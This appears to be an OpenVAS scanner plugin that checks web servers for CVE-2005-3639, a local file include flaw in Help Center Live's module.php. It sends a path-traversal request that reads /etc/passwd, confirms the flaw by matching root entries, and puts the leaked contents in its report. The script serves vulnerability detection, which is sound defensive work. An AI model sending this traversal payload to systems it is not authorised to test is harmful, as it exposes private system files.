# OpenVAS Vulnerability Test
# $Id: hcl_file_include.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Help Center Live module.php local file include flaw
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote web server contains a PHP script that is affected by a
local file file include vulnerability. 

Description :

The remote host is running Help Center Live, a help desk tool written in
PHP. 

The remote version of Help Center Live fails to sanitize input to the
'file' parameter of the 'module.php' script before using it in a PHP
include_once() function.  An attacker can exploit this issue to read
files and possibly execute arbitrary PHP code on the local host subject
to the privileges of the web server user id.";

tag_solution = "Unknown at this time.";

# Ref: HACKERS PAL

 desc = "
  Summary:
  " + tag_summary + "
  Solution:
  " + tag_solution;

if(description)
{
  script_id(20223);
  script_version("$Revision: 17 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2005-3639");
  script_bugtraq_id(15404);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  
  script_name("Help Center Live module.php local file include flaw");

  script_description(desc);
  script_summary("Checks HCL local file include flaw");
  script_category(ACT_GATHER_INFO);
  script_copyright("This script is Copyright (C) 2005 David Maciejak");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_dependencies("http_version.nasl");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

#the code

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! get_port_state(port))exit(0);
if ( ! can_host_php(port:port) ) exit(0);

foreach d (cgi_dirs())
{
 req = http_get(item:string(d, "/module.php?module=osTicket&file=/../../../../../../../../../../../etc/passwd"), port:port);
 res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if(res == NULL) exit(0);
 if("(Powered By Help Center Live" >< res && egrep(pattern:"root:.*:0:[01]:", string:res)){
       if (report_verbosity > 0) {
         contents = strstr(res, '<div align="center"><h2>');
         if (contents) {
           contents = contents - strstr(contents, "<td>");
           contents = strstr(contents, "</div>");
           contents = contents - "</div>";
         }
         else contents = res;

         report = string(
           desc,
           "\n\n",
           "Plugin output :\n",
           "\n",
           contents
         );
       }
       else report = desc;

       security_hole(port:port, data:report);
       exit(0);
 }
}
